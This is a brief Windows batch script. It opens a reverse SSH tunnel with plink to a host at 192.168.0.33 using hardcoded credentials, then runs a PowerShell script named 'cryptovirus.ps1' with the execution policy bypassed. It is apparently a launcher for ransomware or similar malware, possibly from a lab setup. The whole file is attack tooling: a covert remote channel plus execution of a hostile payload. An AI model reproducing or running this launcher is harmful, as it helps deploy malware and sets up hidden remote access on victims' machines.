@ECHO OFF
start cmd /c plink.exe -R 1234:127.0.0.1:1233 sshtunnel@192.168.0.33 -pw sshtunnel -N -batch
PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& '.\cryptovirus.ps1'";

PAUSE
